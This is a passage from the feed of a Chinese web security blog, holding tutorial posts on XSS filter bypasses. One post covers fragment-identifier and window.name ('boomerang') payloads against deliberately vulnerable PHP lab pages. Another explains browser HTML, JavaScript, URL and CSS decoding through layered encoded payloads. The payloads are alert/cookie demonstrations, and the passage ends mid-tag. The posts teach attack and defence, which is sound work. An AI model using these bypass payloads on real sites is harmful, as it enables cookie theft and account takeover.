    <content type="html"><![CDATA[<h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>由于SOP（同源策略）的限制，当父iframe和自iframe不同源时，是无法直接进行通信的。</p><p>对于完全不同源的网站，目前有以下三种方法来解决跨域窗口的通信问题：</p><ul><li>片段标识符fragment；</li><li>window.name；</li><li>window.postMessage；</li></ul><p>其中前两种方法可以在为我们的XSS攻击所利用，第三种主要是postMessage跨域漏洞。</p><p>接下来看看如何利用前面两种方法绕过XSS过滤限制的问题。</p><h2 id="0x02-片段标识符（fragment）"><a href="#0x02-片段标识符（fragment）" class="headerlink" title="0x02 片段标识符（fragment）"></a>0x02 片段标识符（fragment）</h2><p>片段标识符是指在URL中<code>#</code>号之后的内容，比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://a.com/a.php#fragment</span><br></pre></td></tr></table></figure><p>在发起GET请求时，这部分内容并不会传给服务器，所以对服务端来说这部分是透明的。</p><p>父窗口可以将消息写入子窗口的片段标识符中来进行跨域通信。</p><p>看个例子，假设存在如下条件：</p><ul><li>可控点未过滤eval、location.hash.slice/substr、()等；</li><li>针对XSS的防御在服务端实现；</li><li>可控点存在长度限制，需要小于28个字节；</li></ul><p>代码如下，xss1.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$username = <span class="string">"admin"</span>;</span><br><span class="line">$password = <span class="string">"31289ufj123jrfj9jks190fiu"</span>;</span><br><span class="line"></span><br><span class="line">setcookie(<span class="string">"username"</span>, $username);</span><br><span class="line">setcookie(<span class="string">"password"</span>, $password);</span><br><span class="line"></span><br><span class="line">$x = $_GET[<span class="string">'x'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/script|javascript|data|document|focus|&amp;|&lt;|&gt;/i'</span>, $x)) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"No Hacker!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (strlen($x) &gt; <span class="number">28</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Too Long!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;a href='#' onclick='$x'&gt;Click me&lt;/a&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>先尝试插入正常的payload，即<code>http://127.0.0.1/xss1.php?x=javascript:alert(document.cookie)</code>，会发现被过滤了：</p><p><img src="/2020/04/07/跨域通信中的XSS利用/1.png" alt=""></p><p>此时，我们尝试使用片段标识符来绕过。由于片段标识符中的内容不会被传到服务端，当客户端没有对XSS关键字进行过滤时，我们可以利用fragment来将payload隐藏起来，从而绕过服务端的过滤。</p><p>payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// ok</span><br><span class="line">http://127.0.0.1/xss1.php?x=eval(location.hash.slice(1))#javascript:alert(document.cookie)</span><br><span class="line">// failed，超过长度限制</span><br><span class="line">http://127.0.0.1/xss1.php?x=eval(location.hash.substr(1))#javascript:alert(document.cookie)</span><br></pre></td></tr></table></figure><p><img src="/2020/04/07/跨域通信中的XSS利用/2.png" alt=""></p><p>注意，这里必须要使用eval()来执行，因为slice()返回的仅仅是字符串内容。</p><h2 id="0x03-window-name——回旋镖XSS"><a href="#0x03-window-name——回旋镖XSS" class="headerlink" title="0x03 window.name——回旋镖XSS"></a>0x03 window.name——回旋镖XSS</h2><p>当向页面嵌入一个iframe时，可以指定该iframe的name，同时子iframe也可以获取到该name值。</p><p>以window.name为媒介，父iframe和子iframe就可以进行跨域通信了。</p><p>与fragment类似，iframe的name值同样不会发往服务端，此外，还拥有更多的优点：</p><ul><li>无需用到eval、location.hash.slice/substr、()等敏感关键词；</li><li>长度仅为20个字节；</li><li>不会受到客户端校验的影响；</li><li>可以将一个反射型XSS提升为存储型XSS；</li></ul><p>代码如下，xss2.php，只是将前面过滤的规则添加了eval和()、将字符长度限制缩小为20：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$username = <span class="string">"admin"</span>;</span><br><span class="line">$password = <span class="string">"31289ufj123jrfj9jks190fiu"</span>;</span><br><span class="line"></span><br><span class="line">setcookie(<span class="string">"username"</span>, $username);</span><br><span class="line">setcookie(<span class="string">"password"</span>, $password);</span><br><span class="line"></span><br><span class="line">$x = $_GET[<span class="string">'x'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/script|javascript|data|document|focus|&amp;|&lt;|&gt;|\(|\)|eval/i'</span>, $x)) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"No Hacker!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (strlen($x) &gt; <span class="number">20</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Too Long!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;a href='#' onclick='$x'&gt;Click me&lt;/a&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>正常payload或者fragment的payload访问都会被过滤掉，并且payload长度也是远超限制的：</p><p><img src="/2020/04/07/跨域通信中的XSS利用/3.png" alt=""></p><p>此时可以采用回旋镖XSS。</p><p>攻击者在自己的网站新建一个xss.html，通过iframe将目标页面引入，name属性值写入XSS payload：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"http://192.168.43.201/xss2.php?x=location=window.name"</span> <span class="attr">name</span>=<span class="string">"javascript:alert(document.cookie)"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后诱使用户访问攻击者的xss.html页面再点击Click me即可触发XSS：</p><p><img src="/2020/04/07/跨域通信中的XSS利用/4.png" alt=""></p><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://xz.aliyun.com/t/311" target="_blank" rel="noopener">XSS Bypass Cookbook</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Web安全基础" scheme="https://www.mi1k7ea.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="XSS" scheme="https://www.mi1k7ea.com/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>从浏览器解析原理看XSS</title>
    <link href="https://www.mi1k7ea.com/2020/04/06/%E4%BB%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E8%A7%A3%E6%9E%90%E5%8E%9F%E7%90%86%E7%9C%8BXSS/"/>
    <id>https://www.mi1k7ea.com/2020/04/06/从浏览器解析原理看XSS/</id>
    <published>2020-04-06T14:27:31.000Z</published>
    <updated>2020-04-07T14:46:31.779Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>PS：本文参考的pigpig的学习笔记。</p><p>XSS漏洞挖掘的背后，需要我们深入理解浏览器解析原理以及字符编码。</p><p>这里我们就从浏览器解析原理来进一步了解XSS的更多细节。</p><h2 id="0x01-浏览器自解码机制"><a href="#0x01-浏览器自解码机制" class="headerlink" title="0x01 浏览器自解码机制"></a>0x01 浏览器自解码机制</h2><p>浏览器在解析HTML文档时无论按照什么顺序，主要有三个过程：HTML解析、CSS解析、JS解析和URL解析，每个解析器负责HTML文档中各自对应部分的解析工作。</p><p>解析过程具体如下：</p><ol><li>HTML解析：浏览器接收到一个HTML文档时，会使用HTML解析器对HTML文档进行语法解析，完成HTML编码、并创建DOM树；</li><li>JavaScript/CSS解析：JavaScript解析器或CSS解析器，对内嵌脚本进行解析，并完成解码工作；</li><li>URL解析：当浏览器遇到需要URL的上下文环境时，URL解析器也会介入URL的解码工作中。不过URL解析器的解码顺序会根据URL所在位置的不同，工作与JavaScript解析器之前或之后；</li></ol><p><img src="/2020/04/06/从浏览器解析原理看XSS/3.png" alt=""></p><p>从图中可以看出浏览器主要做了三部分的工作：<br>  1. HTML/SVG/XHTML 解析。解析这三种文件会产生一个DOM Tree。<br>  2. CSS 解析，解析CSS会产生CSS规则树。<br>  3. Javascript 解析。（暂时讨论JavaScript动态操作DOM Tree）。<br>  4. URL解析。（这一步的先后顺序不一定，看语境）</p><h2 id="0x02-编码"><a href="#0x02-编码" class="headerlink" title="0x02 编码"></a>0x02 编码</h2><h3 id="HTML字符实体"><a href="#HTML字符实体" class="headerlink" title="HTML字符实体"></a>HTML字符实体</h3><p>在HTML页面中，某些特殊字符并不能直接显示，比如<code>&lt;</code>、<code>&gt;</code>等，浏览器会误认为是标签的开始或结束。如果需要在HTML页面中呈现特殊字符，需要使用它所对应的字符实体。</p><p>字符实体是一个预先定义好的转义序列，它定义了一些无法在文本内容中输入的字符或符号，主要有两种表示方式：</p><ul><li>实体名称：以<code>&amp;</code>开头+预先定义的实体名称+<code>;</code>符号，比如<code>&lt;</code>的实体名称为<code>&amp;lt;</code>；</li><li>实体编号：以<code>&amp;</code>开头+<code>#</code>符号+字符的十进制数（或十六进制数）+<code>;</code>符号，比如<code>&lt;</code>的实体名称为<code>&amp;#60;</code>；</li></ul><h3 id="JavaScript编码"><a href="#JavaScript编码" class="headerlink" title="JavaScript编码"></a>JavaScript编码</h3><p>最常用的Unicode转义序列<code>\uxxxx</code>，其中xxxx表示一个16进制数字，比如<code>&lt;</code>的Unicode编码为<code>\u003c</code>。</p><h3 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h3><p><code>%</code>+字符的ASCII编码所对应的2位16进制数，比如<code>/</code>的URL编码为<code>%2f</code>。</p><h2 id="0x03-解析器"><a href="#0x03-解析器" class="headerlink" title="0x03 解析器"></a>0x03 解析器</h2><h3 id="HTML解析器"><a href="#HTML解析器" class="headerlink" title="HTML解析器"></a>HTML解析器</h3><p>HTML中有五类元素：</p><ol><li>空元素(Void elements)，如<code>&lt;area&gt;</code>,<code>&lt;br&gt;</code>,<code>&lt;base&gt;</code>等等</li><li>原始文本元素(Raw text elements)，有<code>&lt;script&gt;</code>和<code>&lt;style&gt;</code></li><li>RCDATA元素(RCDATA elements)，有<code>&lt;textarea&gt;</code>和<code>&lt;title&gt;</code></li><li>外部元素(Foreign elements)，例如MathML命名空间或者SVG命名空间的元素</li><li>基本元素(Normal elements)，即除了以上4种元素以外的元素</li></ol><p>五类元素的区别如下：</p><ol><li>空元素，不能容纳任何内容（因为它们没有闭合标签，没有内容能够放在开始标签和闭合标签中间）。</li><li>原始文本元素，可以容纳文本。</li><li>RCDATA元素，可以容纳文本和字符引用。</li><li>外部元素，可以容纳文本、字符引用、CDATA段、其他元素和注释</li><li>基本元素，可以容纳文本、字符引用、其他元素和注释</li></ol><p>HTML解析器作为一个状态机，它从输入流中获取字符并按照转换规则转换到另一种状态。在解析过程中，任何时候它只要遇到一个<code>&lt;</code>符号（后面没有跟<code>/</code>符号）就会进入“标签开始状态(Tag open state)”。然后转变到“标签名状态(Tag name state)”，“前属性名状态(before attribute name state)”……最后进入“数据状态(Data state)”并释放当前标签的token。当解析器处于“数据状态(Data state)”时，它会继续解析，每当发现一个完整的标签，就会释放出一个token。</p><p><img src="/2020/04/06/从浏览器解析原理看XSS/2.png" alt=""></p><p>举个例子：存在<code>&lt;h1&gt;test&lt;/h1&gt;</code> ，首先状态机吃下<code>&lt;</code> 进入标签开始状态然后转变到标签名状态开始匹配标签</p><p>当吃进去<code>/&gt;</code>标签的时候进入标签结束状态然后进入<code>Data state</code>状态。</p><p>一般来说HTML编码需要在<code>Data State</code> 状态下进行。例如如果存在<code>&lt;&amp;#104;1&gt;test&lt;/h1&gt;</code> 那么就无法解析这个编码。但是如果是<code>&lt;h1&gt;tes&amp;#116;&lt;/h1&gt;</code> 却能够正确成功的解析。</p><p>HTML状态机可容纳<code>RCDATA</code>状态中的字符引用，这意味着在<code>&lt;textarea&gt;</code>和<code>&lt;title&gt;</code>标签中的字符引用会被HTML解析器解码，对<code>RCDATA</code>有个特殊的情况。在浏览器解析<code>RCDATA</code>元素的过程中，解析器会进入<code>“RCDATA状态”</code>。在这个状态中，如果遇到<code>&lt;</code>字符，它会转换到RCDATA小于号状态。如果<code>&lt;</code>字符后没有紧跟着<code>/</code>和对应的标签名，解析器会转换回<code>RCDATA状态</code>。这意味着在<code>RCDATA</code>元素标签的内容中（例如<code>&lt;textarea&gt;</code>或<code>&lt;title&gt;</code>的内容中），唯一能够被解析器认做是标签的就是<code>&lt;/textarea&gt;</code>或者<code>&lt;/title&gt;</code>。当然，这要看开始标签是哪一个。因此，在<code>&lt;textarea&gt;</code>和<code>&lt;title&gt;</code>的内容中不会创建标签，不会有脚本执行。</p><p>在建立好DOM语法树之后浏览器开始进行URL或者JavaScript解码。这意味着你如果在JS标签中使用HTML实体编码是没有用的，例如：<code>&lt;script&gt;alert&amp;#40;&#39;1&#39;)&lt;/script&gt;</code>。</p><h3 id="JavaScript解析器"><a href="#JavaScript解析器" class="headerlink" title="JavaScript解析器"></a>JavaScript解析器</h3><p>JavaScript中可以使用Unicode转义序列<code>\uxxxx</code>来表示一个字符，xxxx表示一个16进制数字。比如<code>&lt;</code>的Unicode编码为<code>\u003c</code>。</p><p>下面看下几个payload。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这个payload是无法执行的，因为在JavaScript中，单引号、双引号和小括号都是属于控制字符，编码后将无法识别。</p><p>改成如下payload即可成功执行：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">\u0061\u006c\u0065\u0072\u0074(</span>'\<span class="attr">u0031</span>')&gt;</span></span><br></pre></td></tr></table></figure><p>结合HTML编码，还可以将payload进行实体化：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#49;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;c&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#53;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#55;&amp;#50;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#55;&amp;#52;&amp;#40;&amp;#39;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#51;&amp;#49;&amp;#39;&amp;#41;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>此时，执行顺序为：HTML解码–&gt;JavaScript解码–&gt;弹框。</p><p>注意：编码之间的转换使用<a href="https://evilcos.me/lab/xssor/" target="_blank" rel="noopener">XSS’OR工具</a>即可。</p><h3 id="CSS解析器"><a href="#CSS解析器" class="headerlink" title="CSS解析器"></a>CSS解析器</h3><blockquote><p>一般来说，CSS 解析器会做接下来的工作，不过一般来说，为了考虑到更好的体验和性能，并不会等到所有的html都解析完成之后再去构建和布局render树。它是解析完一部分内容就显示一部分内容，同时，可能还在通过网络下载其余内容。</p><p>当然CSS不会干扰到DOM 树的建立，他会结合CSS文件和style 标签，以及HTML中的课件指令来构建起reder tree。这里JavaScrit 的 CSSOM api 也会出一些力。</p><p>CSS 编码解析是用了一套不太正统的转义策略：<strong>用一个反斜杠，后边跟1~6位十六进制数字构成。</strong>，所以字母e 可以编码为 \65, \065,\000065。而因为这样，后边就不能直接紧跟数字或字母，否则会被当成转义里的内容处理，所以CSS 选择了空格作为终止标识，在解码的时候，再将空格去除。</p><p>同时，CSS还支持直接使用反斜杠对非十六进制字符进行转义的方式，就按紧跟着反斜杠后边的字符的字面意思进行解释，这种机制可用来转义引号和反斜杠本身，不过不能转义HTML 控制的字符，比如尖括号，那是因为HTML 解析器总是先于CSS 解析器。</p><p>由于CSS 转义规定的语焉不详，许多解析器会对本该用引号括起来的字符串进行任意的转义，特别的，在IE 浏览器里，这种转义优先级高于伪函数语法，于是下边两种情况的写法是一样的：</p></blockquote><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">color</span><span class="selector-pseudo">:expression(alert(1))</span></span><br><span class="line"><span class="selector-tag">color</span><span class="selector-pseudo">:expression</span>\028 <span class="selector-tag">alert</span> \028 1 \029 \029</span><br></pre></td></tr></table></figure><h3 id="URL解析器"><a href="#URL解析器" class="headerlink" title="URL解析器"></a>URL解析器</h3><p>假设有payload如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert(0)"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>浏览器遇到<code>&lt;</code>时使用HTML解析器来解析，遇到href时使用URL解析器来解析，再遇到JavaScript时使用JavaScript解析器来解析。</p><p>我们可以按照浏览器的思维，反过来构造payload。</p><p>首先进行JavaScript编码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:\u0061\u006c\u0065\u0072\u0074(0)"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后进行URL编码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(0)"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>最后进行HTML编码（十进制和十六进制表示都OK）：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x30;&amp;#x29;"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">或</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#37;&amp;#53;&amp;#99;&amp;#37;&amp;#55;&amp;#53;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#54;&amp;#37;&amp;#51;&amp;#49;&amp;#37;&amp;#53;&amp;#99;&amp;#37;&amp;#55;&amp;#53;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#54;&amp;#37;&amp;#54;&amp;#51;&amp;#37;&amp;#53;&amp;#99;&amp;#37;&amp;#55;&amp;#53;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#54;&amp;#37;&amp;#51;&amp;#53;&amp;#37;&amp;#53;&amp;#99;&amp;#37;&amp;#55;&amp;#53;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#55;&amp;#37;&amp;#51;&amp;#50;&amp;#37;&amp;#53;&amp;#99;&amp;#37;&amp;#55;&amp;#53;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#55;&amp;#37;&amp;#51;&amp;#52;&amp;#40;&amp;#48;&amp;#41;"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x04-从Payload理解浏览器解析"><a href="#0x04-从Payload理解浏览器解析" class="headerlink" title="0x04 从Payload理解浏览器解析"></a>0x04 从Payload理解浏览器解析</h2><h3 id="payload1"><a href="#payload1" class="headerlink" title="payload1"></a>payload1</h3><p>对<code>javascript:alert(0)</code>进行URL编码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%30%29"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这样的payload是无法成功执行的，因为在URL解析器工作时，不能对协议类型进行任何的编码操作，否则URL解析器会认为它是无类型的，从而导致JavaScript没有被解码，自然也就不会被URL解析器所识别了。</p><p>URL规定协议、用户名、密码都必须是ASCII，编码当然就无效了。</p><blockquote><p>A URL’s scheme is an ASCII string that identifies the type of URL and can be used to dispatch a URL for further processing after parsing. It is initially the empty string.</p><p>A URL’s username is an ASCII string identifying a username. It is initially the empty string.</p><p>A URL’s password is an ASCII string identifying a password. It is initially the empty string.</p><p>from <a href="https://url.spec.whatwg.org/#concept-url" target="_blank" rel="noopener">https://url.spec.whatwg.org/#concept-url</a></p></blockquote><h3 id="payload2"><a href="#payload2" class="headerlink" title="payload2"></a>payload2</h3><p>先对JavaScript进行HTML编码，然后对<code>alert(0)</code>进行URL编码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:%61%6c%65%72%74%28%30%29"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>该payload能正常执行，因为HTML解析器先进行HTML解码，接下来URL解析器解析到href中的URL时，由于JavaScript已经被HTML解码了，因此URL解析器得到并识别了JavaScript协议，从而对后续内容进行URL解码。</p><h3 id="payload3"><a href="#payload3" class="headerlink" title="payload3"></a>payload3</h3><p>对<code>:</code>进行URL编码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript%3aalert(0)"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>该payload无法执行，理由用payload1，因为URL协议必须是ASCII，不能进行任何的编码（javascript:）。</p><h3 id="payload4"><a href="#payload4" class="headerlink" title="payload4"></a>payload4</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&amp;#60;img src=x onerror=alert(0)&amp;#62;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里包含了HTML编码内容，反过来以开发者的角度思考，HTML编码就是为了显示这些特殊字符，而不干扰正常的DOM解析，所以这里面的内容不会变成一个img元素，也不会被执行。</p><p>从HTML解析机制看，在读取<code>&lt;div&gt;</code>之后进入数据状态，<code>&amp;#60;</code>会被HTML解码，但不会进入标签开始状态，当然也就不会创建<code>img</code>元素，也就不会执行。</p><h3 id="payload5"><a href="#payload5" class="headerlink" title="payload5"></a>payload5</h3><p>在textarea标签中内嵌script标签：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(0)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br></pre></td></tr></table></figure><p>该payload无法执行，因为textarea标签中的所有内容均为纯文本形式。</p><p><code>&lt;textarea&gt;</code>是<code>RCDATA</code>元素（RCDATA elements），可以容纳文本和字符引用，注意<strong>不能容纳其他元素</strong>，直接显示。</p><p>注意：<code>RCDATA</code>元素（RCDATA elements）包括<code>textarea</code>和<code>title</code>。</p><h3 id="payload6"><a href="#payload6" class="headerlink" title="payload6"></a>payload6</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">"confirm('0\u0027);"</span>&gt;</span>Button<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><p>该payload无法执行，因为在JavaScript中不能对控制字符进行JavaScript编码，比如单引号、双引号、圆括号等。</p><blockquote><p>In string literals, regular expression literals, template literals and identifiers, any Unicode code point may also be expressed using Unicode escape sequences that explicitly express a code point’s numeric value.</p><p>from <a href="https://www.ecma-international.org/ecma-262/10.0/index.html#sec-ecmascript-language-source-code" target="_blank" rel="noopener">https://www.ecma-international.org/ecma-262/10.0/index.html#sec-ecmascript-language-source-code</a> （这个链接很卡）</p><p>标识符（identifiers）</p><p>代码中用来标识变量、函数、或属性的字符序列。</p><p>在JavaScript中，标识符只能包含字母或数字或下划线（“_”）或美元符号（“$”），且不能以数字开头。标识符与字符串不同之处在于字符串是数据，而标识符是代码的一部分。在 JavaScript 中，无法将标识符转换为字符串，但有时可以将字符串解析为标识符。</p><p>from <a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Identifier" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Glossary/Identifier</a></p></blockquote><h3 id="payload7"><a href="#payload7" class="headerlink" 